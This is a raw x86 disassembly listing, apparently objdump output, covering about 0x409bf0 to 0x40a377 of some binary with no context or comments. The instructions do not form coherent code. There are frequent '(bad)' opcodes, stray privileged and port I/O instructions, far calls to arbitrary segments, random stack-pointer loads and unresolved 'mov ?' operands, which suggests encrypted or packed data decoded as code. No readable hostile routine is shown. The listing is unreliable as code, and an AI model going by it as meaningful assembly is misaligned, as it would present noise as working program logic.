  409bf0:	shr    DWORD PTR [ecx-0x1b],1
  409bf3:	fld    st(4)
  409bf5:	mov    ebp,0xa1012991
  409bfa:	push   esi
  409bfb:	adc    ah,BYTE PTR [esp+edi*1]
  409bfe:	jl     0x409bc9
  409c00:	adc    ebp,DWORD PTR [eax+0x7abfa387]
  409c06:	add    esp,ecx
  409c08:	add    eax,0x5813af43
  409c0d:	loop   0x409c66
  409c0f:	and    DWORD PTR [esi-0x7692bfe9],eax
  409c15:	xchg   ecx,eax
  409c16:	push   ecx
  409c17:	xor    al,0xe6
  409c19:	adc    edx,DWORD PTR [ebx+0x55]
  409c1c:	add    DWORD PTR [edi-0x79b1d0eb],ebx
  409c22:	jnp    0x409bf0
  409c24:	cmp    esp,ebp
  409c26:	dec    ecx
  409c27:	lea    esp,[ecx-0x2d]
  409c2a:	or     al,0x4b
  409c2c:	icebp  
  409c2d:	(bad)  
  409c2e:	mov    bl,0xb
  409c30:	das    
  409c31:	dec    esi
  409c32:	shl    DWORD PTR ds:0x577775bf,0xc4
  409c39:	mov    ebp,0xd86048dd
  409c3e:	mov    edx,0xd80ca377
  409c43:	nop
  409c44:	or     BYTE PTR [esi],cl
  409c46:	div    BYTE PTR [ecx+0x33]
  409c49:	pop    es
  409c4a:	nop
  409c4b:	popf   
  409c4c:	jmp    0x409c8a
  409c4e:	in     al,0x3c
  409c50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c51:	sbb    cl,BYTE PTR ds:0xfcd5e6d3
  409c57:	mov    al,0xae
  409c59:	aam    0xf6
  409c5b:	(bad)  
  409c5c:	sub    bl,ah
  409c5e:	popf   
  409c5f:	inc    edx
  409c60:	gs xchg esp,eax
  409c62:	xchg   edi,eax
  409c63:	enter  0x57cb,0x60
  409c67:	push   edx
  409c68:	rcl    DWORD PTR [ecx-0x23],1
  409c6b:	mov    ch,0xe2
  409c6d:	stos   BYTE PTR es:[edi],al
  409c6e:	mov    eax,ds:0x171a6e54
  409c73:	mov    cl,0xc
  409c75:	inc    eax
  409c76:	xchg   edx,eax
  409c77:	mov    ah,0x34
  409c79:	in     eax,0xeb
  409c7b:	xlat   BYTE PTR ds:[ebx]
  409c7c:	cwde   
  409c7d:	mov    esp,0x24def3dc
  409c82:	lea    ebp,[ecx]
  409c84:	ins    DWORD PTR es:[edi],dx
  409c85:	dec    esp
  409c86:	outs   dx,DWORD PTR gs:[esi]
  409c88:	test   edi,ebx
  409c8a:	inc    eax
  409c8b:	push   edx
  409c8c:	call   0xd89a:0x2fd4740
  409c93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c94:	mov    ecx,DWORD PTR [edx]
  409c96:	std    
  409c97:	neg    BYTE PTR [eax-0x3b]
  409c9a:	div    BYTE PTR [ebx-0x3fcbbdff]
  409ca0:	stos   DWORD PTR es:[edi],eax
  409ca1:	add    al,0xa
  409ca3:	ss retf 0xf953
  409ca7:	add    eax,0xcdfd7915
  409cac:	mov    esp,0x82aa29ea
  409cb1:	jnp    0x409c68
  409cb3:	pop    ebp
  409cb4:	inc    edx
  409cb5:	mov    esp,0x24883c17
  409cba:	inc    ebx
  409cbb:	ret    0xfc21
  409cbe:	and    bl,al
  409cc0:	lods   al,BYTE PTR ds:[esi]
  409cc1:	jae    0x409c5c
  409cc3:	push   ss
  409cc4:	mov    al,ds:0x5a3012b8
  409cc9:	bnd jg 0x409d34
  409ccc:	push   ds
  409ccd:	sub    cl,bh
  409ccf:	pushf  
  409cd0:	fsub   DWORD PTR [ebp+0x6a53b2bf]
  409cd6:	test   al,0xd0
  409cd8:	xor    eax,0xfdd669f9
  409cdd:	sub    al,0xc0
  409cdf:	mov    cl,0x69
  409ce1:	aam    0x28
  409ce3:	aam    0x3f
  409ce5:	mov    DWORD PTR [eax-0x73850134],ebp
  409ceb:	and    al,ah
  409ced:	js     0x409d34
  409cef:	or     BYTE PTR [edx],0xde
  409cf2:	shl    DWORD PTR [eax+0xe],0xe4
  409cf6:	dec    edi
  409cf7:	push   esi
  409cf8:	jl     0x409c93
  409cfa:	outs   dx,DWORD PTR ds:[esi]
  409cfb:	sub    bh,dl
  409cfd:	mov    dl,BYTE PTR [edi-0x4f]
  409d00:	or     al,0xfd
  409d02:	sub    bl,dl
  409d04:	pop    eax
  409d05:	jns    0x409d5c
  409d07:	cmp    BYTE PTR [edx-0x61f1511a],ah
  409d0d:	xchg   edi,eax
  409d0e:	ret    0x7685
  409d11:	call   0x426b:0xc5944969
  409d18:	cmc    
  409d19:	jmp    0x409ce9
  409d1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d1c:	add    dh,BYTE PTR [eax-0x9]
  409d1f:	or     esi,DWORD PTR [ebx+0x1]
  409d22:	pop    ecx
  409d23:	fsubr  QWORD PTR [esi-0x570ed307]
  409d29:	jmp    0xdd8644a7
  409d2e:	add    ebx,DWORD PTR ds:0xec37a2fe
  409d34:	mov    BYTE PTR [ebp+esi*4-0x6cf003e0],cl
  409d3b:	lods   eax,DWORD PTR ds:[esi]
  409d3c:	cs xor al,0xfa
  409d3f:	std    
  409d40:	jmp    0x43664209
  409d45:	jns    0x409cf5
  409d47:	dec    ebx
  409d48:	cmc    
  409d49:	shl    WORD PTR [edi+0x51939a7d],1
  409d50:	frstor [edi]
  409d52:	inc    eax
  409d53:	push   ds
  409d54:	repz (bad) 
  409d56:	aaa    
  409d57:	and    bl,ah
  409d59:	repnz (bad) 
  409d5b:	sahf   
  409d5c:	lock pop ds
  409d5e:	add    bh,al
  409d60:	jg     0x409d6d
  409d62:	call   0x9ad75555
  409d67:	push   0xd0833379
  409d6c:	sbb    bh,bl
  409d6e:	cmp    eax,0x619552ed
  409d73:	inc    ebx
  409d74:	or     BYTE PTR [ecx],ch
  409d76:	les    edx,FWORD PTR [edi]
  409d78:	mov    cl,cl
  409d7a:	push   ecx
  409d7b:	jb     0x409dee
  409d7d:	push   esi
  409d7e:	add    ah,BYTE PTR [eax+0x73]
  409d81:	add    esp,DWORD PTR [eax]
  409d83:	mov    eax,ds:0x2c8bb4f0
  409d88:	adc    al,0xb5
  409d8a:	aad    0x47
  409d8c:	outs   dx,BYTE PTR ds:[esi]
  409d8d:	sbb    esi,DWORD PTR [edi+0x4a]
  409d90:	loope  0x409d34
  409d92:	lea    eax,[ebx+0x72]
  409d95:	lahf   
  409d96:	and    BYTE PTR [eax-0x6a],0x79
  409d9a:	rcr    BYTE PTR [ebp+ecx*2-0x16cd8514],cl
  409da1:	mov    ecx,0x8ca6cc3a
  409da6:	or     esp,esi
  409da8:	scas   al,BYTE PTR es:[edi]
  409da9:	pop    ds
  409daa:	imul   dh
  409dac:	iret   
  409dad:	or     ebx,DWORD PTR ds:0x52e93217
  409db3:	adc    al,al
  409db5:	or     BYTE PTR [esi],dl
  409db7:	or     eax,0x4fa596e1
  409dbc:	and    bl,BYTE PTR [ebp+0x3c1260fd]
  409dc2:	lds    edi,FWORD PTR [edi]
  409dc4:	sbb    eax,0x558b560d
  409dc9:	or     al,BYTE PTR [esi-0x4ef6b677]
  409dcf:	adc    eax,0x3fb40b4e
  409dd4:	ret    
  409dd5:	adc    al,0x54
  409dd7:	test   bl,bl
  409dd9:	ins    DWORD PTR es:[edi],dx
  409dda:	xchg   edi,eax
  409ddb:	xchg   edi,eax
  409ddc:	fmul   DWORD PTR [ecx]
  409dde:	pushf  
  409ddf:	inc    ebp
  409de0:	mov    ?,ebp
  409de2:	jo     0x409dbf
  409de4:	icebp  
  409de5:	mov    ah,0xe0
  409de7:	(bad)  
  409de8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409de9:	jns    0x409e4b
  409deb:	xchg   BYTE PTR [ecx],al
  409ded:	imul   DWORD PTR [eax+eiz*1-0x51b6560a]
  409df4:	setb   dl
  409df7:	out    0xe9,al
  409df9:	push   es
  409dfa:	dec    eax
  409dfb:	mov    DWORD PTR [esi+0x4e],esi
  409dfe:	add    al,0xa3
  409e00:	imul   ebp,DWORD PTR [esi-0x1c],0xa51a58b8
  409e07:	sbb    al,0xa8
  409e09:	dec    edx
  409e0a:	stos   DWORD PTR es:[edi],eax
  409e0b:	out    dx,al
  409e0c:	outs   dx,DWORD PTR ds:[esi]
  409e0d:	push   ebx
  409e0e:	xor    BYTE PTR [ecx+0x6ac2e0d2],bh
  409e14:	je     0x409e6a
  409e16:	adc    al,0x8d
  409e18:	add    eax,0x258120d4
  409e1d:	sbb    al,0x6f
  409e1f:	mov    bl,BYTE PTR ds:0x13c3f167
  409e25:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  409e27:	xor    al,0xef
  409e29:	loope  0x409e7a
  409e2b:	stos   DWORD PTR es:[edi],eax
  409e2c:	ret    
  409e2d:	inc    ebx
  409e2e:	ret    
  409e2f:	xor    edi,DWORD PTR [esi+0xcebe9bd]
  409e35:	sbb    eax,0x14cffd4d
  409e3a:	repz retf 0xdbe2
  409e3e:	dec    esp
  409e3f:	xchg   ebx,eax
  409e40:	lds    ebp,FWORD PTR fs:[esi+0x12f98310]
  409e47:	and    DWORD PTR [ebx],esi
  409e49:	xor    al,0x5
  409e4b:	pop    ebx
  409e4c:	xchg   ecx,eax
  409e4d:	rol    BYTE PTR [edx],0x80
  409e50:	push   ds
  409e51:	jne    0x409df5
  409e53:	push   eax
  409e54:	jmp    0x77f4ac15
  409e59:	in     al,dx
  409e5a:	push   ebp
  409e5b:	loop   0x409ea1
  409e5d:	sar    BYTE PTR [edx-0x66],cl
  409e60:	or     dl,BYTE PTR [edi+0x3e]
  409e63:	adc    cl,BYTE PTR [ebp-0xb]
  409e66:	scas   al,BYTE PTR es:[edi]
  409e67:	dec    edi
  409e68:	iret   
  409e69:	cwde   
  409e6a:	jbe    0x409e4c
  409e6c:	lods   eax,DWORD PTR ds:[esi]
  409e6d:	dec    edi
  409e6e:	and    DWORD PTR [ecx+eiz*4],edx
  409e71:	inc    esp
  409e72:	idiv   ecx
  409e74:	mov    bh,BYTE PTR [ebp+0x204a98b7]
  409e7a:	test   DWORD PTR [eax],edx
  409e7c:	cli    
  409e7d:	add    BYTE PTR [eax+0x31a934b5],bl
  409e83:	mov    ch,0x14
  409e85:	stos   BYTE PTR es:[edi],al
  409e86:	fstp   QWORD PTR [edx]
  409e88:	mov    ch,0x7
  409e8a:	mov    al,ds:0x8d10a2d8
  409e8f:	inc    ebp
  409e90:	nop
  409e91:	mov    cs:0x62fc4125,eax
  409e97:	xor    eax,0x9898bcdc
  409e9c:	mov    ecx,0xba4e5911
  409ea1:	push   esi
  409ea2:	cmp    al,0xed
  409ea4:	sub    dl,dh
  409ea6:	nop
  409ea7:	fiadd  DWORD PTR [esi+0x53b78e68]
  409ead:	mov    cs,edi
  409eaf:	hlt    
  409eb0:	jno    0x409f31
  409eb2:	inc    eax
  409eb3:	(bad)  
  409eb5:	xlat   BYTE PTR ds:[ebx]
  409eb6:	sbb    dl,BYTE PTR [esi]
  409eb8:	enter  0x59d7,0x77
  409ebc:	jle    0x409e8f
  409ebe:	imul   esp,DWORD PTR [ecx-0x6b653e07],0x2e15f1f1
  409ec8:	hlt    
  409ec9:	pop    esi
  409eca:	jecxz  0x409e96
  409ecc:	jbe    0x409f4d
  409ece:	mov    ebp,0xd2dfab14
  409ed3:	cli    
  409ed4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ed5:	cdq    
  409ed6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ed7:	ja     0x409e61
  409ed9:	pop    es
  409eda:	push   ss
  409edb:	test   eax,0xbf823ed5
  409ee0:	stos   DWORD PTR es:[edi],eax
  409ee1:	stos   DWORD PTR es:[edi],eax
  409ee2:	dec    ebp
  409ee3:	pop    ss
  409ee4:	or     al,bl
  409ee6:	loope  0x409eff
  409ee8:	jp     0x409f11
  409eea:	dec    edi
  409eeb:	ins    BYTE PTR es:[edi],dx
  409eec:	arpl   sp,ax
  409eee:	out    dx,eax
  409eef:	or     BYTE PTR [edx-0x605b4742],dl
  409ef5:	test   DWORD PTR [edi+0x4f],eax
  409ef8:	and    eax,0x7b065ea0
  409efd:	sub    DWORD PTR [ebp+0x42],ebx
  409f00:	xor    DWORD PTR [esp+esi*4-0x78],eax
  409f04:	es ins BYTE PTR es:[edi],dx
  409f06:	bound  esi,QWORD PTR ds:0xf2156f2a
  409f0c:	jle    0x409edb
  409f0e:	xor    DWORD PTR [eax-0xad2068f],edi
  409f14:	int3   
  409f15:	scas   eax,DWORD PTR es:[edi]
  409f16:	pushf  
  409f17:	jnp    0x409ee2
  409f19:	xlat   BYTE PTR ds:[ebx]
  409f1a:	sahf   
  409f1b:	hlt    
  409f1c:	jg     0x409efb
  409f1e:	push   edx
  409f1f:	jb     0x409f49
  409f21:	inc    ebx
  409f22:	retf   0xd674
  409f25:	jnp    0x409f14
  409f27:	sbb    eax,0x6df589ff
  409f2c:	xchg   ecx,eax
  409f2d:	stos   DWORD PTR es:[edi],eax
  409f2e:	lods   eax,DWORD PTR ds:[esi]
  409f2f:	in     eax,dx
  409f30:	clc    
  409f31:	aas    
  409f32:	mov    ch,0xb1
  409f34:	inc    ebx
  409f35:	das    
  409f36:	and    ch,BYTE PTR [edx]
  409f38:	and    edx,DWORD PTR [edx]
  409f3a:	xchg   edi,eax
  409f3b:	ins    DWORD PTR es:[edi],dx
  409f3c:	pop    eax
  409f3d:	stos   BYTE PTR es:[edi],al
  409f3e:	cli    
  409f3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f40:	dec    edx
  409f41:	out    0xee,al
  409f43:	mov    eax,ds:0x513ddf2e
  409f48:	je     0x409f87
  409f4a:	stc    
  409f4b:	cmp    bl,ah
  409f4d:	mov    ebx,0x3a4d0f62
  409f52:	xchg   edi,eax
  409f53:	inc    edi
  409f54:	lea    ecx,[esi+0x5f0e76f6]
  409f5a:	rcl    ecx,0xa5
  409f5d:	mov    ds:0xac74602d,al
  409f62:	mov    ebp,0xfd172e0e
  409f67:	jns    0x409f7d
  409f69:	push   edi
  409f6a:	ret    0xc7b1
  409f6d:	jl     0x409f9e
  409f6f:	fnstenv [esi]
  409f71:	mov    eax,0xc9e476c7
  409f76:	push   edx
  409f77:	ins    DWORD PTR es:[edi],dx
  409f78:	mov    esi,0xfb18dd8c
  409f7d:	xchg   ebx,eax
  409f7e:	jl     0x409f06
  409f80:	push   ecx
  409f81:	xor    DWORD PTR [edi],esp
  409f83:	and    ah,BYTE PTR [eax]
  409f85:	adc    BYTE PTR [edx+0x23d36a21],dh
  409f8b:	add    eax,0x793822e9
  409f90:	inc    ebx
  409f91:	mov    eax,0x8f38cf83
  409f96:	sub    dl,BYTE PTR [edi-0x56]
  409f99:	sti    
  409f9a:	xchg   edi,eax
  409f9b:	mov    al,ds:0x6e994c54
  409fa0:	retf   0x3044
  409fa3:	addr16 leave 
  409fa5:	sbb    bl,BYTE PTR [edi-0x42]
  409fa8:	lahf   
  409fa9:	fs push ebx
  409fab:	scas   al,BYTE PTR es:[edi]
  409fac:	sti    
  409fad:	mov    eax,ds:0xabe62f17
  409fb2:	sub    DWORD PTR [ebp+0x55],esp
  409fb5:	outs   dx,DWORD PTR ds:[esi]
  409fb6:	int    0xa9
  409fb8:	push   ds
  409fb9:	call   0x4036f3a9
  409fbe:	aaa    
  409fbf:	ja     0x409fcf
  409fc1:	add    al,0xbb
  409fc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fc4:	jmp    0x8c19:0x79225ff6
  409fcb:	adc    DWORD PTR [esi],edi
  409fcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fce:	dec    edi
  409fcf:	(bad)  
  409fd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fd1:	add    ebp,edi
  409fd3:	pop    ebx
  409fd4:	cmp    eax,0x8f05332b
  409fd9:	call   0x689e:0x3978826a
  409fe0:	pop    eax
  409fe1:	mov    BYTE PTR [esi-0x58d7708f],al
  409fe7:	sar    DWORD PTR [ecx],cl
  409fe9:	adc    ch,al
  409feb:	xchg   edi,eax
  409fec:	shl    BYTE PTR [ecx*2+0x6d48af8a],cl
  409ff3:	loop   0x409f95
  409ff5:	repz cmp DWORD PTR ds:0x9e5d3743,ebx
  409ffc:	(bad)  
  409ffe:	pop    ecx
  409fff:	int3   
  40a000:	pop    ds
  40a001:	outs   dx,BYTE PTR ds:[esi]
  40a002:	inc    ecx
  40a003:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a004:	test   eax,0x435bdbb5
  40a009:	or     DWORD PTR [edi],esp
  40a00b:	aam    0xd4
  40a00d:	fsub   DWORD PTR [edi]
  40a00f:	xchg   ecx,eax
  40a010:	inc    edi
  40a011:	mov    ?,WORD PTR [edi-0x3bc50b9e]
  40a017:	jle    0x40a058
  40a019:	scas   eax,DWORD PTR es:[edi]
  40a01a:	sti    
  40a01b:	push   esi
  40a01c:	push   esi
  40a01d:	sub    eax,0x96f51f47
  40a022:	stos   BYTE PTR es:[edi],al
  40a023:	pop    ebx
  40a024:	xchg   BYTE PTR [ecx+0x60],ch
  40a027:	mov    al,ds:0xb9efcc6e
  40a02c:	repz cmp esi,esi
  40a02f:	push   cs
  40a030:	ret    0x1c31
  40a033:	xchg   DWORD PTR [ebx+0x6e],ebx
  40a036:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a037:	push   edx
  40a038:	enterw 0x23df,0xf6
  40a03d:	mov    ds:0x53c43468,al
  40a042:	in     eax,0x55
  40a044:	push   0x3a1b8b1d
  40a049:	arpl   bp,cx
  40a04b:	mov    esi,0x6c5e16e8
  40a050:	push   0xd4ee554b
  40a055:	pop    ss
  40a056:	jp     0x40a0be
  40a058:	adc    BYTE PTR [ebp+0x2d],cl
  40a05b:	fs inc esi
  40a05d:	adc    BYTE PTR [esi-0x53d777c],0x8
  40a064:	std    
  40a065:	xchg   esp,eax
  40a066:	(bad)
  40a06a:	mov    al,ds:0x665e683
  40a06f:	jae    0x40a022
  40a071:	out    dx,al
  40a072:	pop    ebx
  40a073:	ja     0x40a0ca
  40a075:	mov    ah,0xb7
  40a077:	dec    esp
  40a078:	mov    ecx,0x8d7453af
  40a07d:	ret    0x2338
  40a080:	(bad)  
  40a081:	jmp    0x40a041
  40a083:	pop    ebp
  40a084:	int    0xed
  40a086:	adc    ebp,DWORD PTR [ecx+0x5b]
  40a089:	js     0x40a05d
  40a08b:	retf   
  40a08c:	mov    eax,0x9b5267b2
  40a091:	bound  ecx,QWORD PTR [edx-0x47]
  40a094:	sbb    DWORD PTR [esi-0x77],edx
  40a097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a098:	retf   0x7d8
  40a09b:	iret   
  40a09c:	mov    cs:0x72b15492,eax
  40a0a2:	mov    WORD PTR [ebx],ds
  40a0a4:	cmp    al,dh
  40a0a6:	and    bh,dl
  40a0a8:	xchg   esp,eax
  40a0a9:	mov    ah,BYTE PTR [ebp-0x35]
  40a0ac:	push   ebp
  40a0ad:	jmp    0x40a063
  40a0af:	xor    eax,0xd46c4ed3
  40a0b4:	std    
  40a0b5:	sbb    BYTE PTR [ebp+0x59],dl
  40a0b8:	mov    dh,0x7d
  40a0ba:	out    0xd7,al
  40a0bc:	into   
  40a0bd:	pusha  
  40a0be:	xchg   esp,eax
  40a0bf:	pop    esp
  40a0c0:	loope  0x40a04e
  40a0c2:	sub    DWORD PTR [esi+0x15cf87fd],eax
  40a0c8:	idiv   BYTE PTR [edx]
  40a0ca:	mov    bh,0x99
  40a0cc:	imul   ecx,edx,0x4f314e3b
  40a0d2:	adc    al,al
  40a0d4:	outs   dx,BYTE PTR ds:[esi]
  40a0d5:	mov    ah,0xbe
  40a0d7:	sbb    al,0xe1
  40a0d9:	jg     0x40a118
  40a0db:	fisttp DWORD PTR [edx+0x7d3a2d3d]
  40a0e1:	push   0xf2bc51fb
  40a0e6:	mov    dh,0xb1
  40a0e9:	jge    0x40a0fd
  40a0eb:	(bad)  
  40a0ec:	and    al,0xde
  40a0ee:	push   0x29
  40a0f0:	ja     0x40a07b
  40a0f2:	dec    esi
  40a0f3:	inc    edx
  40a0f4:	cmp    DWORD PTR [eax],esi
  40a0f6:	mov    cl,0x1c
  40a0f8:	ja     0x40a142
  40a0fa:	jae    0x40a0f0
  40a0fc:	fcomp  DWORD PTR [bp+si-0x5]
  40a100:	mov    eax,0xb9b5774c
  40a105:	jmp    0x83d2:0xf6b11159
  40a10c:	xor    al,BYTE PTR [ecx]
  40a10e:	mov    esi,0xd5086ef3
  40a113:	out    dx,al
  40a114:	test   DWORD PTR [ebp-0x3a3ff70],ebx
  40a11a:	jg     0x40a131
  40a11c:	xor    BYTE PTR [edx+ebp*1],0xb1
  40a120:	test   BYTE PTR [eax+edi*8+0xafd7f05],ch
  40a127:	(bad)  
  40a129:	repnz sub ax,0x5008
  40a12e:	cld    
  40a12f:	aad    0xaa
  40a131:	adc    al,0xd7
  40a133:	pop    edx
  40a134:	mov    cl,ch
  40a136:	xchg   BYTE PTR [ebx-0x4b],cl
  40a139:	jmp    0x66cc:0x4a763ce7
  40a140:	sub    eax,0xfae10f0
  40a145:	xor    eax,edi
  40a147:	and    esi,DWORD PTR [ecx+0x40550289]
  40a14d:	add    esi,DWORD PTR [ecx]
  40a14f:	cmp    BYTE PTR [edx],dl
  40a151:	inc    esp
  40a152:	cdq    
  40a153:	jns    0x40a172
  40a155:	mov    BYTE PTR [edx],dh
  40a157:	mov    al,0x86
  40a159:	addr16 mov dh,0x71
  40a15c:	push   esp
  40a15d:	or     eax,0x883d99ed
  40a162:	cmp    ebp,ebx
  40a164:	(bad)  
  40a165:	xchg   ebp,eax
  40a166:	and    edx,ebx
  40a168:	bound  edi,QWORD PTR [esi]
  40a16a:	push   ebp
  40a16b:	push   esi
  40a16c:	cld    
  40a16d:	and    DWORD PTR [esi-0x403662e1],esi
  40a173:	(bad)  
  40a174:	(bad)  
  40a175:	sbb    bl,BYTE PTR [eax-0x41b706d]
  40a17b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a17c:	ret    
  40a17d:	push   ecx
  40a17e:	cmp    BYTE PTR [eax-0x5ae3a341],dl
  40a184:	pop    ds
  40a185:	sbb    BYTE PTR [edi],ch
  40a187:	dec    ebx
  40a188:	ror    DWORD PTR [edx-0x3557b504],cl
  40a18e:	jecxz  0x40a1ea
  40a190:	aad    0x69
  40a192:	fwait
  40a193:	inc    ebp
  40a194:	cmp    esi,DWORD PTR [ebx+ecx*1]
  40a197:	inc    esi
  40a198:	jge    0x40a1b3
  40a19a:	imul   edi,DWORD PTR [ecx-0x27],0xffffff94
  40a19e:	mov    bl,0xdc
  40a1a0:	pop    esi
  40a1a1:	sbb    DWORD PTR [ebx-0xa4b230e],0x10de8f64
  40a1ab:	imul   ebp,edi,0xffffffe4
  40a1ae:	pushf  
  40a1af:	pop    edi
  40a1b0:	dec    ecx
  40a1b1:	shl    cl,0xfc
  40a1b4:	add    al,bl
  40a1b6:	jo     0x40a183
  40a1b8:	or     BYTE PTR [ebx-0x73],ah
  40a1bb:	mov    eax,0x9dcd05cf
  40a1c0:	(bad)
  40a1c3:	es call 0x90c8:0x7d172b94
  40a1cb:	(bad)  
  40a1cc:	mov    eax,ds:0x374874c
  40a1d1:	pop    ecx
  40a1d2:	pop    esp
  40a1d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1d4:	sub    eax,0xc77fb757
  40a1d9:	adc    eax,0x6fd0b77e
  40a1de:	mov    ch,0xb3
  40a1e0:	ja     0x40a1d9
  40a1e2:	scas   al,BYTE PTR es:[edi]
  40a1e3:	inc    ebx
  40a1e4:	or     ch,BYTE PTR [ebx-0x629ad441]
  40a1ea:	and    esp,DWORD PTR [edx]
  40a1ec:	push   cs
  40a1ed:	out    0x4e,eax
  40a1ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1f0:	jle    0x40a192
  40a1f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1f3:	sub    DWORD PTR [edi],edi
  40a1f5:	jl     0x40a182
  40a1f7:	pop    esp
  40a1f8:	test   eax,0x49e83374
  40a1fd:	or     dh,BYTE PTR [ebp-0x35]
  40a200:	sbb    al,0xc
  40a202:	jmp    0x43b344ea
  40a207:	and    eax,0xa94600ef
  40a20c:	or     esp,DWORD PTR [edx+ecx*2]
  40a20f:	mov    edx,0xc245a3b7
  40a214:	jbe    0x40a24f
  40a216:	xor    edi,DWORD PTR ds:0xd678524d
  40a21c:	xchg   edx,eax
  40a21d:	cmp    DWORD PTR [eax+0x35754adb],ecx
  40a223:	and    ah,BYTE PTR [edi]
  40a225:	ds call 0x4d8d6db9
  40a22b:	in     al,0x96
  40a22d:	mov    DWORD PTR ds:0x484e5b09,edx
  40a233:	mov    al,ds:0xf9b96e4f
  40a238:	arpl   WORD PTR [ebp-0x349e7df7],bp
  40a23e:	mov    eax,DWORD PTR [ebx+0x22061811]
  40a244:	adc    al,dh
  40a246:	and    bl,BYTE PTR [ebx+edi*4]
  40a249:	adc    BYTE PTR [ebp-0x4e],bl
  40a24c:	ret    
  40a24d:	mov    dh,0xcd
  40a24f:	fild   DWORD PTR [esi+0x58]
  40a252:	adc    cl,bh
  40a254:	out    0xaa,al
  40a256:	aaa    
  40a257:	pop    ebx
  40a258:	jae    0x40a29b
  40a25a:	aaa    
  40a25b:	out    dx,al
  40a25c:	inc    esp
  40a25d:	test   al,0xa
  40a25f:	dec    esp
  40a260:	lods   eax,DWORD PTR ds:[esi]
  40a261:	fnstcw WORD PTR [edi+ecx*2+0x7b2ddabf]
  40a268:	test   al,0xbe
  40a26a:	pop    esp
  40a26b:	sar    BYTE PTR [edx+0x52],0xae
  40a26f:	mov    bh,0x7d
  40a271:	adc    DWORD PTR [edx+0x7954f355],0xffffffc4
  40a278:	fwait
  40a279:	scas   ax,WORD PTR es:[edi]
  40a27b:	hlt    
  40a27c:	retf   
  40a27d:	jg     0x40a26b
  40a27f:	loope  0x40a290
  40a281:	iret   
  40a282:	in     al,dx
  40a283:	shl    BYTE PTR [ecx+0x36],1
  40a286:	div    DWORD PTR [ecx+0x82546a5]
  40a28c:	mov    WORD PTR [ecx+0x5d],ds
  40a28f:	aam    0xd7
  40a291:	dec    ebp
  40a292:	mov    ah,0x92
  40a294:	add    BYTE PTR [edi],bh
  40a296:	mov    ch,0xfd
  40a298:	gs jmp 0xae3c:0x1be8da0d
  40a2a0:	hlt    
  40a2a1:	test   eax,0xc6f6dacc
  40a2a6:	js     0x40a297
  40a2a8:	pop    ebp
  40a2a9:	int    0x15
  40a2ab:	jo     0x40a314
  40a2ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2ae:	inc    edi
  40a2af:	test   eax,0x603381ab
  40a2b4:	push   ecx
  40a2b5:	xchg   ebx,eax
  40a2b6:	xor    al,0xb
  40a2b8:	dec    ecx
  40a2b9:	fs and eax,ebp
  40a2bc:	call   0xf6704151
  40a2c1:	adc    DWORD PTR [esi],edx
  40a2c3:	out    0xcc,al
  40a2c5:	and    dl,BYTE PTR [edi]
  40a2c7:	xor    ch,BYTE PTR [ecx+eax*1-0x40]
  40a2cb:	mov    WORD PTR [ebp-0x51],fs
  40a2ce:	inc    ecx
  40a2cf:	adc    BYTE PTR [eax-0x4],0x9e
  40a2d3:	test   eax,0x206c53f
  40a2d8:	xchg   bx,ax
  40a2da:	jl     0x40a30b
  40a2dc:	mov    eax,0x6d4bcb2
  40a2e1:	mov    esi,0xb28e8af2
  40a2e6:	daa    
  40a2e7:	int    0x69
  40a2e9:	xchg   ebx,eax
  40a2ea:	xchg   edi,eax
  40a2eb:	mov    esp,0xd8f75f4d
  40a2f0:	pop    esp
  40a2f1:	clc    
  40a2f2:	mov    cl,0x4e
  40a2f4:	mov    ch,0x9f
  40a2f6:	xchg   ebp,eax
  40a2f7:	cmp    edx,esp
  40a2f9:	(bad)  
  40a2fa:	cmc    
  40a2fb:	je     0x40a353
  40a2fd:	dec    edi
  40a2fe:	inc    esi
  40a2ff:	push   es
  40a300:	inc    edi
  40a301:	aad    0x86
  40a303:	std    
  40a304:	inc    edx
  40a305:	call   0xe50e:0x878f4790
  40a30c:	popf   
  40a30d:	push   es
  40a30e:	repnz inc esp
  40a310:	mov    edi,0xb8c1e9b7
  40a315:	cwde   
  40a316:	pop    edi
  40a317:	cmp    BYTE PTR [esi],0x7c
  40a31a:	xor    eax,0xe9e3a4c2
  40a31f:	mov    dh,0x3d
  40a321:	addr16 es pop ebp
  40a324:	and    BYTE PTR [edx],dh
  40a326:	sbb    bl,BYTE PTR [eax+0x4c1f978f]
  40a32c:	gs retf 
  40a32e:	std    
  40a32f:	cwde   
  40a330:	repz add eax,0xaeb3fc85
  40a336:	ror    DWORD PTR [edx+0x732a97c8],0x4e
  40a33d:	out    0x9e,eax
  40a33f:	adc    eax,esi
  40a341:	pop    ss
  40a342:	inc    edi
  40a343:	(bad)  
  40a345:	sub    eax,0x59d14ffe
  40a34a:	sub    dl,dl
  40a34c:	adc    al,0xf9
  40a34e:	nop
  40a34f:	leave  
  40a350:	cmp    ah,dl
  40a352:	sar    esi,1
  40a354:	pop    es
  40a355:	shr    DWORD PTR [eax+0x573d88d1],1
  40a35b:	lods   eax,DWORD PTR ds:[esi]
  40a35c:	push   cs
  40a35d:	mov    bh,0x75
  40a35f:	xor    eax,0x5f82c9bc
  40a364:	shl    BYTE PTR [ecx+0x20],cl
  40a367:	jns    0x40a376
  40a369:	(bad)  
  40a36a:	test   BYTE PTR ds:[eax+0x636358e4],bl
  40a371:	fnstenv [edx+0x14911321]
  40a377:	jecxz  0x40a3e6
